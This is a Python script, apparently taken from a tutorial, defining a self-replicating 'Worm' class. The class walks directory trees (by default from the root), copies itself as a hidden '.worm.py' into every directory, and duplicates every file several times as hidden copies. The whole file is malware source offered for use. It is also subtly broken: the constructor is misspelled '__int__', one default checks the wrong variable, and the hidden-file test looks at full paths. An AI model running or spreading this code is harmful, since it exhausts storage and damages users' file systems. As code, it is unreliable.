import os
import shutil

class Worm:
    def __int__(self, path=None, target_dir_list=None, iteration=None):

       # path: defines where to start looking for directories (default is set to the root directory /)

        if isinstance(path,type(None)):
            self.path = "/"
        else:
            self.path = path

        # target_dir_list: user can pass a list of initial target directories. By default it is an empty list []

        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list

        # iteration: I used this parameter to define how many instances the worm will create for each existing file in a directory (default value is 2 only for testing purpose, you can increase or decrease the number, or better provide valur while creating an object of the class)

        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration

        # get own absolute path
        self.own_path = os.path.realpath(__file__)

    # Method to list all Directories and Subdirectories
    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass

    # Method to Replicate the WormPermalink
    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)

    # Method to copy existing Files
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source, destination)

    #  Method to integrate everything
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()

    # Main FunctionPermalink
if __name__=="__main__":
    current_directory = os.path.abspath("")
    worm = Worm(path=current_directory)
    worm.start_worm_actions()

